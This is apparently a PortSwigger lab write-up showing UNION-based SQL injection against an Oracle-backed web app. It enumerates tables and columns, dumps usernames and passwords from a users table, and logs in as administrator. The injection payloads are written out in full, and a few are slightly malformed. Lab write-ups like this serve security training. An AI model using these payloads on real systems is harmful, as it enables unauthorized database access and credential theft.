## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234487924-92fe230b-d01c-4d88-8f40-ece849a2d2e2.png)

## Solution :

Request captred and send to repeater

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c4871936-3247-419c-a66a-054f99fee48b)


#### Determine number of columns -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' 'UNION SELECT NULL,NULL FROM DUAL--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/71bfc96c-fd7c-4289-8d1b-83bc894afff2)

NO error which means there are 2 columns.

#### Determine column with text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'' UNION SELECT 'a','b' FROM DUAL--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2946b30d-3a32-4492-b3b9-c197077f435b)


Both columns have text data

#### List all tables -

We  can list all the tables by querying `SELECT * FROM all_tables`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM all_tables--
```

We get a list of all the tables

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d78a830a-4d91-41b0-aee6-3aa3063ebe9e)


i think the table we are looking for is `USERS_BJMNXT` it look like a costom made table.


#### List all columns -

We can list all the columns by querying `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_BJMNXT'--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c9eb7d3e-4da0-4464-8ea6-96e411600623)

The names of the columns containing usernames and passwords are.

`USERNAME_XPYOVL` And  `PASSWORD_BHTLLM`

#### Retreive admin's password


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_XPYOVL,PASSWORD_BHTLLM FROM USERS_BJMNXT--

```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ce08b3bf-561b-4142-9ea3-c87fb5370aa0)

the passord retreived 

administrator - `xvt5w8ifjjdhwq89qmg9`
carlos        - `24q1jgfxrc6da8hvj4m8`
wiener        - `ecqsa1h4bmtkrhj79p45`

Now try to login as administrator

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ae6ec4ee-0cd2-46de-b192-b974f2ed30bb)

loged in succesful.
